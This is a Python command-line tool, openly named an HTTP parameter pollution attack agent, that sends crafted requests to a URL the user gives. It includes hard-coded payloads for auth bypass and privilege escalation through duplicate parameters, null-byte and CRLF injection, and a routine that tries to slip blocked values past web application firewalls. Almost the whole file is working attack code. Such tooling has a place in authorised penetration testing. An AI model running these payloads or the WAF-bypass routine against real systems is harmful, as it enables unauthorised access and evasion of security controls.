#!/usr/bin/env python3
"""Agent for performing HTTP parameter pollution (HPP) attack testing."""

import json
import argparse
from datetime import datetime
from urllib.parse import urlencode, parse_qs, urlparse

try:
    import requests
except ImportError:
    requests = None


HPP_PAYLOADS = {
    "duplicate_param": [
        {"params": "id=1&id=2", "desc": "Duplicate parameter — tests server-side precedence"},
        {"params": "user=admin&user=guest", "desc": "Duplicate user param — tests auth bypass"},
        {"params": "action=view&action=delete", "desc": "Action override — tests privilege escalation"},
    ],
    "encoding_bypass": [
        {"params": "id=1%26admin%3Dtrue", "desc": "URL-encoded & and = inside value"},
        {"params": "id=1%00&admin=true", "desc": "Null byte injection with extra param"},
        {"params": "search=test%0d%0ainjected:header", "desc": "CRLF injection in param value"},
    ],
    "array_syntax": [
        {"params": "id[]=1&id[]=2", "desc": "PHP array syntax duplicate"},
        {"params": "id=1,2,3", "desc": "Comma-separated values"},
        {"params": "items[0]=a&items[1]=b", "desc": "Indexed array parameters"},
    ],
}


def test_parameter_precedence(url, param_name="id", headers=None):
    """Test which parameter value the server uses when duplicated."""
    hdrs = headers or {}
    results = []
    test_pairs = [("FIRST", "SECOND"), ("admin", "guest"), ("1", "99999")]
    for val1, val2 in test_pairs:
        full_url = f"{url}?{param_name}={val1}&{param_name}={val2}"
        try:
            resp = requests.get(full_url, headers=hdrs, timeout=10, allow_redirects=False)
            body = resp.text[:2000]
            uses_first = val1 in body and val2 not in body
            uses_last = val2 in body and val1 not in body
            uses_both = val1 in body and val2 in body
            precedence = "FIRST" if uses_first else "LAST" if uses_last else "BOTH" if uses_both else "UNKNOWN"
            results.append({
                "values": [val1, val2], "precedence": precedence,
                "status": resp.status_code, "content_length": len(body),
            })
        except Exception as e:
            results.append({"values": [val1, val2], "error": str(e)})
    return {"url": url, "param": param_name, "precedence_tests": results}


def test_hpp_payloads(url, method="GET", headers=None):
    """Send HPP test payloads and analyze responses."""
    hdrs = headers or {}
    results = []
    baseline = None
    try:
        baseline_resp = requests.get(url, headers=hdrs, timeout=10)
        baseline = {"status": baseline_resp.status_code, "length": len(baseline_resp.text)}
    except Exception:
        pass
    for category, payloads in HPP_PAYLOADS.items():
        for payload in payloads:
            try:
                if method == "GET":
                    test_url = f"{url}?{payload['params']}" if "?" not in url else f"{url}&{payload['params']}"
                    resp = requests.get(test_url, headers=hdrs, timeout=10, allow_redirects=False)
                else:
                    resp = requests.post(url, data=payload["params"], headers={**hdrs, "Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
                anomaly = False
                if baseline:
                    anomaly = abs(len(resp.text) - baseline["length"]) > 100 or resp.status_code != baseline["status"]
                results.append({
                    "category": category, "payload": payload["params"],
                    "desc": payload["desc"], "status": resp.status_code,
                    "response_length": len(resp.text), "anomaly": anomaly,
                })
            except Exception as e:
                results.append({"category": category, "payload": payload["params"], "error": str(e)})
    anomalies = [r for r in results if r.get("anomaly")]
    return {
        "url": url, "method": method, "baseline": baseline,
        "total_tests": len(results), "anomalies_found": len(anomalies),
        "results": results, "anomaly_details": anomalies,
        "finding": "HPP_VULNERABLE" if anomalies else "HPP_NOT_DETECTED",
        "severity": "MEDIUM" if anomalies else "INFO",
    }


def test_waf_bypass(url, blocked_param, blocked_value, headers=None):
    """Test if HPP can bypass WAF parameter filtering."""
    hdrs = headers or {}
    tests = [
        {"name": "direct", "params": {blocked_param: blocked_value}},
        {"name": "duplicate_first", "params": f"{blocked_param}=benign&{blocked_param}={blocked_value}"},
        {"name": "duplicate_last", "params": f"{blocked_param}={blocked_value}&{blocked_param}=benign"},
        {"name": "encoded", "params": {blocked_param: blocked_value.replace("'", "%27").replace("<", "%3C")}},
        {"name": "array", "params": f"{blocked_param}[]={blocked_value}"},
    ]
    results = []
    for test in tests:
        try:
            if isinstance(test["params"], dict):
                resp = requests.get(url, params=test["params"], headers=hdrs, timeout=10, allow_redirects=False)
            else:
                resp = requests.get(f"{url}?{test['params']}", headers=hdrs, timeout=10, allow_redirects=False)
            blocked = resp.status_code in (403, 406, 429) or "blocked" in resp.text.lower()[:500]
            results.append({"name": test["name"], "status": resp.status_code, "blocked_by_waf": blocked})
        except Exception as e:
            results.append({"name": test["name"], "error": str(e)})
    bypasses = [r for r in results if not r.get("blocked_by_waf") and not r.get("error") and r.get("status") == 200]
    return {
        "url": url, "param": blocked_param, "tests": results,
        "bypass_found": len(bypasses) > 1,
        "bypass_methods": [b["name"] for b in bypasses],
    }


def main():
    if not requests:
        print(json.dumps({"error": "requests not installed"}))
        return
    parser = argparse.ArgumentParser(description="HTTP Parameter Pollution Attack Agent")
    sub = parser.add_subparsers(dest="command")
    p = sub.add_parser("precedence", help="Test parameter precedence")
    p.add_argument("--url", required=True)
    p.add_argument("--param", default="id")
    t = sub.add_parser("test", help="Run HPP payload tests")
    t.add_argument("--url", required=True)
    t.add_argument("--method", default="GET", choices=["GET", "POST"])
    w = sub.add_parser("waf", help="Test WAF bypass with HPP")
    w.add_argument("--url", required=True)
    w.add_argument("--param", required=True)
    w.add_argument("--value", required=True)
    args = parser.parse_args()
    if args.command == "precedence":
        result = test_parameter_precedence(args.url, args.param)
    elif args.command == "test":
        result = test_hpp_payloads(args.url, args.method)
    elif args.command == "waf":
        result = test_waf_bypass(args.url, args.param, args.value)
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
